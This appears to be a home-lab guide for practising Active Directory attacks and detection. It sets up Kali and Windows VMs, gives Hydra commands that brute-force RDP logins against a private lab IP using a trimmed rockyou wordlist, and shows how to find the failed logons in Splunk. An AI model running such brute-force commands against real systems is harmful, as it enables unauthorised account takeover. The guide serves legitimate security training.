# Kali Linux (Attacking Machine) Lab Setup

> **Note:**  
> For this lab, ensure all virtual machines (Windows 10, Windows Server, Kali Linux) are running, along with the Splunk server on the Ubuntu VM.

---

## 1. NAT Network Configuration

- Connect all virtual machines to a **NAT Network** in your virtualization platform to ensure a safe and isolated lab environment.
  
https://github.com/user-attachments/assets/67a252dd-0141-466f-a16a-fb61e4151aa8


---


## 2. Kali Linux IP Configuration

1. **Start Kali Linux** in VirtualBox.
2. On the desktop, right-click the **Network** icon and select **Edit Connections**.
3. Select your connection and click the **Settings** icon.
4. Go to the **IPv4** tab. Change the **Method** from `Automatic (DHCP)` to `Manual`.
5. Click **Add** and enter the following details:
    - **IP address:** `192.168.10.250`
    - **Netmask:** `24`
    - **Gateway:** `192.168.10.1`
    - **DNS Server:** `8.8.8.8`
6. Save the settings.
7. Right-click the **Network** icon again and click **Disconnect** to reset the connection, then reconnect.
8. Open a Terminal and verify your IP:
    ```bash
    ip a
    ```
9. Check internet connectivity:
    ```bash
    ping 8.8.8.8
    ```
    - If there is no packet loss, your setup is correct.
10. Update Kali Linux:
    ```bash
    sudo apt-get update && sudo apt-get upgrade
    ```

https://github.com/user-attachments/assets/e31b0921-12fc-4316-8466-62d446e0728a


---


## 3. Target Machine (Windows) RDP Setup

1. Start the **Target Machine** (e.g., Windows 10).
2. Open the **Start Menu**, search for “This PC,” and open **Properties**.
3. Scroll down and click **Advanced System Settings**.
4. In the **System Properties** window, go to the **Remote** tab.
5. Enable **Allow remote connections to this computer**.
6. Click **Select Users…** and then **Add…** to add users allowed for RDP.
7. Enter the desired user(s), click **Check Names**, and save.

https://github.com/user-attachments/assets/50394a04-ab92-481a-8f62-f2e182e52176


---


## 4. Preparing a Password List for Brute Forcing

1. Open Terminal in Kali and go to the Desktop:
    ```bash
    cd ~/Desktop
    ```
2. Create a project directory:
    ```bash
    mkdir ad-project
    cd ad-project
    ```
3. Copy the default wordlist:
    ```bash
    cp /usr/share/wordlists/rockyou.txt .
    ```
4. Create a smaller password file for testing:
    ```bash
    head -n 20 rockyou.txt > passwords.txt
    ```
5. Edit or add passwords as needed:
    ```bash
    nano passwords.txt
    ```
    - Add or edit passwords, then save with `CTRL+O` and exit with `CTRL+X`.
6. Confirm the file exists:
    ```bash
    ls
    ```
https://github.com/user-attachments/assets/e2a092fc-5e40-4f08-a728-329b49eeb516


---


## 5. Performing a Brute Force Attack with Hydra

1. Navigate to your project directory:
    ```bash
    cd ~/Desktop/ad-project
    ```
2. Run Hydra for a single username:
    ```bash
    hydra -l jennyj -P passwords.txt rdp://192.168.10.100 -t 1
    ```
    - `-l` specifies the username.
    - `-P` points to your password list.
    - `rdp://192.168.10.100` is the RDP protocol and target IP.
    - `-t 1` sets the number of parallel tasks.
3. To attack multiple users:
    - Create a username list:
      ```bash
      nano login.txt
      ```
      (Add usernames, one per line. Save and exit.)
    - Run Hydra:
      ```bash
      hydra -L login.txt -P passwords.txt rdp://192.168.10.100 -t 1
      ```
    - `-L` is used for multiple usernames.

- Hydra will display successful username/password combinations.


https://github.com/user-attachments/assets/cfb8a722-c421-4429-a004-153ea8bd96de


---


## 6. Monitoring the Attack in Splunk

1. On your Windows 10 or Windows Server VM, open a browser and go to the Splunk server:
    ```
    http://192.168.10.10:8000
    ```
2. In Splunk, go to **Apps > Search & Reporting**.
3. In the search bar, enter:
    ```
    index="endpoint" jennyj
    ```
    - This will show all logs/events related to the user "jennyj."
4. On the left, click **EventCode** to view event codes.
    - **4625:** Account failed to log on (failed login attempts)
    - **4624:** Account successfully logged on
5. Clicking an event shows details, including workstation and attacker's IP.

> **Tip:** Multiple failed logins in a short time likely indicate a brute-force attack.


https://github.com/user-attachments/assets/37c1ef54-11bb-4b35-be7e-8e9de5cc9e5b


---

## Additional Recommendations

- Always use isolated networks for labs.
- Never attack real/live systems without permission.
- MAke it 

---

**This guide provides a safe, educational environment for practicing Active Directory attacks and monitoring. For any issues or clarifications, consult the documentation or reach out to your instructor.**
